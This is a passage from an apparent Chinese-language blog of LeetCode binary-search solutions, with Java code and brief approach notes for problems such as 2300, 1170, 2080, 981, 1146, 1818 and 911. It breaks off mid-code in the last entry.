<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTheDistanceValue</span><span class="params">(<span class="type">int</span>[] arr1, <span class="type">int</span>[] arr2, <span class="type">int</span> d)</span> &#123;</span><br><span class="line">        <span class="comment">// Arrays.sort(arr1);</span></span><br><span class="line">        Arrays.sort(arr2);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> lower_bound(arr2, arr1[i]);</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;</span><br><span class="line">                res += (arr2[<span class="number">0</span>] - arr1[i] &lt;= d) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == arr2.length) &#123;</span><br><span class="line">                res += (arr1[i] - arr2[arr2.length - <span class="number">1</span>] &lt;= d) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr2[j] - arr1[i] &gt; d &amp;&amp; arr1[i] - arr2[j - <span class="number">1</span>] &gt; d) &#123;</span><br><span class="line">                    res += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &gt;= target) right = mid;</span><br><span class="line">            <span class="keyword">else</span> left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nums[left] &lt; target) <span class="keyword">return</span> nums.length;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2300-咒语和药水的成功对数"><a href="#2300-咒语和药水的成功对数" class="headerlink" title="2300. 咒语和药水的成功对数"></a><a href="https://leetcode.cn/problems/successful-pairs-of-spells-and-potions/">2300. 咒语和药水的成功对数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">排序+ 二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] successfulPairs(<span class="type">int</span>[] spells, <span class="type">int</span>[] potions, <span class="type">long</span> success) &#123;</span><br><span class="line">        Arrays.sort(potions);</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[spells.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; spells.length; i++) &#123;</span><br><span class="line">            res[i] = binarySearch(spells[i], potions, success);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span> spell, <span class="type">int</span>[] potions, <span class="type">long</span> success)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = potions.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">long</span>) spell * potions[mid] &gt;= success) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((<span class="type">long</span>) spell * potions[left] &lt; success) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> potions.length - left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1170-比较字符串最小字母出现频次"><a href="#1170-比较字符串最小字母出现频次" class="headerlink" title="1170. 比较字符串最小字母出现频次"></a><a href="https://leetcode.cn/problems/compare-strings-by-frequency-of-the-smallest-character/">1170. 比较字符串最小字母出现频次</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">words可以预处理加排序</span><br><span class="line">然后二分就好</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] numSmallerByFrequency(String[] queries, String[] words) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> queries.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> words.length;</span><br><span class="line">        <span class="type">int</span>[] wordsRecord = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; words.length; i++) &#123;</span><br><span class="line">            wordsRecord[i] = getLowCharFre(words[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(wordsRecord);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; queries.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> getLowCharFre(queries[i]);</span><br><span class="line">            res[i] = binarySearch(count, wordsRecord);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] wordsRecord)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> wordsRecord.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(wordsRecord[mid] &gt; target)&#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(wordsRecord[left] &lt;= target) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> wordsRecord.length - left;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="title function_">getLowCharFre</span><span class="params">(String word)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">wordLength</span> <span class="operator">=</span> word.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">minChar</span> <span class="operator">=</span> <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; wordLength; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(word.charAt(j) == minChar) count++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (word.charAt(j) &lt; minChar) &#123;</span><br><span class="line">                minChar = word.charAt(j);</span><br><span class="line">                count = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不难，但繁琐</p>
<h3 id="2080-区间内查询数字的频率"><a href="#2080-区间内查询数字的频率" class="headerlink" title="2080. 区间内查询数字的频率"></a><a href="https://leetcode.cn/problems/range-frequency-queries/">2080. 区间内查询数字的频率</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hash表加二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RangeFreqQuery</span> &#123;</span><br><span class="line">    Map&lt;Integer, List&lt;Integer&gt;&gt; map;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RangeFreqQuery</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            map.computeIfAbsent(arr[i], k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = map.get(value);</span><br><span class="line">        <span class="keyword">if</span>(list == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> lower_bound(list, right + <span class="number">1</span>) - lower_bound(list, left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(List&lt;Integer&gt; list, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> list.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (list.get(mid) &gt;= target) right = mid;</span><br><span class="line">            <span class="keyword">else</span> left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(list.get(left) &lt; target) <span class="keyword">return</span> list.size();</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your RangeFreqQuery object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * RangeFreqQuery obj = new RangeFreqQuery(arr);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj.query(left,right,value);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="2856-删除数对后的最小数组长度"><a href="#2856-删除数对后的最小数组长度" class="headerlink" title="2856. 删除数对后的最小数组长度"></a><a href="https://leetcode.cn/problems/minimum-array-length-after-pair-removals/">2856. 删除数对后的最小数组长度</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果数字不相同那么随便删。但是相同的话就得用其它的删，有多个相同的数字，就相同数字之间互删(互删过程中优先选出现次数多的删)</span><br><span class="line">所以其实本质就是看出现次数最多的数字频率，也就是得出数字最大频率</span><br><span class="line"></span><br><span class="line">然后有个idea如果某个数出现次数超过一般那么肯定值为nums[n/2] </span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minLengthAfterRemovals</span><span class="params">(List&lt;Integer&gt; nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.size();</span><br><span class="line">        <span class="type">int</span> <span class="variable">midNum</span> <span class="operator">=</span> nums.get(n / <span class="number">2</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> lowerBound(nums, midNum + <span class="number">1</span>) - lowerBound(nums, midNum);</span><br><span class="line">        <span class="keyword">if</span> (count &gt; n / <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> count - (n - count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n % <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">lowerBound</span><span class="params">(List&lt;Integer&gt; nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums.get(mid) &gt;= target) right = mid;</span><br><span class="line">            <span class="keyword">else</span> left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nums.get(left) &lt; target) <span class="keyword">return</span> nums.size();</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="981-基于时间的键值存储"><a href="#981-基于时间的键值存储" class="headerlink" title="981. 基于时间的键值存储"></a><a href="https://leetcode.cn/problems/time-based-key-value-store/">981. 基于时间的键值存储</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">哈希表+二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TimeMap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        <span class="type">int</span> timestamp;</span><br><span class="line">        String value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> timestamp, String value)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.timestamp = timestamp;</span><br><span class="line">            <span class="built_in">this</span>.value = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Map&lt;String, List&lt;Node&gt;&gt; map;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TimeMap</span><span class="params">()</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(String key, String value, <span class="type">int</span> timestamp)</span> &#123;</span><br><span class="line">        map.computeIfAbsent(key, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(<span class="keyword">new</span> <span class="title class_">Node</span>(timestamp, value));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">(String key, <span class="type">int</span> timestamp)</span> &#123;</span><br><span class="line">        List&lt;Node&gt; list = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(list == <span class="literal">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> list.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right + <span class="number">1</span>)/<span class="number">2</span>;<span class="comment">//left&lt;mid&lt;=right</span></span><br><span class="line">            <span class="keyword">if</span>(list.get(mid).timestamp &lt;= timestamp)&#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(list.get(left).timestamp&lt;=timestamp) <span class="keyword">return</span>  list.get(left).value;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your TimeMap object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * TimeMap obj = new TimeMap();</span></span><br><span class="line"><span class="comment"> * obj.set(key,value,timestamp);</span></span><br><span class="line"><span class="comment"> * String param_2 = obj.get(key,timestamp);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>



<h3 id="1146-快照数组"><a href="#1146-快照数组" class="headerlink" title="1146. 快照数组"></a><a href="https://leetcode.cn/problems/snapshot-array/">1146. 快照数组</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先想暴力思路。暴力思路是每次都保存完整的副本到arraylist里面，但这样肯定不行的</span><br><span class="line">新建个node类保存快照号和值，然后二分即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SnapshotArray</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="type">int</span> snapId;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> snapId, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.snapId = snapId;</span><br><span class="line">            <span class="built_in">this</span>.value = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;Integer, List&lt;Node&gt;&gt; map;</span><br><span class="line">    <span class="type">int</span> snapId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SnapshotArray</span><span class="params">(<span class="type">int</span> length)</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        snapId = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        List&lt;Node&gt; nodes = map.computeIfAbsent(index, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="keyword">if</span> (nodes.isEmpty()) &#123;</span><br><span class="line">            nodes.add(<span class="keyword">new</span> <span class="title class_">Node</span>(snapId, val));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nodes.get(nodes.size() - <span class="number">1</span>).snapId == snapId) &#123;</span><br><span class="line">            nodes.get(nodes.size() - <span class="number">1</span>).value = val;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            nodes.add(<span class="keyword">new</span> <span class="title class_">Node</span>(snapId, val));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">snap</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> snapId++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> snap_id)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!map.containsKey(index)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        List&lt;Node&gt; nodes = map.get(index);</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nodes.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nodes.get(mid).snapId &lt;= snap_id)&#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nodes.get(left).snapId &lt;= snap_id) <span class="keyword">return</span> nodes.get(left).value;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your SnapshotArray object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * SnapshotArray obj = new SnapshotArray(length);</span></span><br><span class="line"><span class="comment"> * obj.set(index,val);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.snap();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.get(index,snap_id);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="1818-绝对差值和"><a href="#1818-绝对差值和" class="headerlink" title="1818. 绝对差值和"></a><a href="https://leetcode.cn/problems/minimum-absolute-sum-difference/">1818. 绝对差值和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制一下nums1数组，然后排序。然后计算出结果，然后二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minAbsoluteSumDiff</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) (<span class="number">1e9</span> + <span class="number">7</span>);</span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(nums1, nums1.length);</span><br><span class="line">        Arrays.sort(arr);</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums1.length; i++) &#123;</span><br><span class="line">            sum += Math.abs(nums1[i] - nums2[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        res = sum;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums1.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> lowerBound(arr, nums2[i]);</span><br><span class="line">            <span class="keyword">if</span>(index == <span class="number">0</span>)&#123;</span><br><span class="line">                res = Long.min(res, sum - Math.abs(nums1[i] - nums2[i]) + Math.abs(arr[index] - nums2[i]));</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                res = Long.min(res, sum - Math.abs(nums1[i] - nums2[i]) + Math.abs(arr[index] - nums2[i]));</span><br><span class="line">                res = Long.min(res, sum - Math.abs(nums1[i] - nums2[i]) + Math.abs(arr[index - <span class="number">1</span>] - nums2[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) (res % MOD_NUM);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">lowerBound</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">// arr[retVal] &gt;= target</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;<span class="comment">//left&lt;=mid&lt;right</span></span><br><span class="line">            <span class="keyword">if</span> (arr[mid] &gt;= target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        if(arr[left] &lt; target) return arr.length;</span></span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="911-在线选举"><a href="#911-在线选举" class="headerlink" title="911. 在线选举"></a><a href="https://leetcode.cn/problems/online-election/">911. 在线选举</a></h3><p>思路一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二维list加二分</span><br></pre></td></tr></table></figure>

<p>代码一（到第88个测试用例超时了）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TopVotedCandidate</span> &#123;</span><br><span class="line"></span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TopVotedCandidate</span><span class="params">(<span class="type">int</span>[] persons, <span class="type">int</span>[] times)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> persons.length;</span><br><span class="line">        list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            list.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; persons.length; i++) &#123;</span><br><span class="line">            list.get(persons[i]).add(times[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">q</span><span class="params">(<span class="type">int</span> t)</span> &#123;</span><br><span class="line">        <span class="comment">//times[0] &lt;= t 保证了都有结果</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">candidateNo</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">candidateVotedNum</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lastTime</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (list.get(i).isEmpty()) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> [] retVal = upper_bound(list.get(i), t);</span><br><span class="line">                <span class="keyword">if</span>(retVal[<span class="number">0</span>] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(candidateVotedNum &lt; retVal[<span 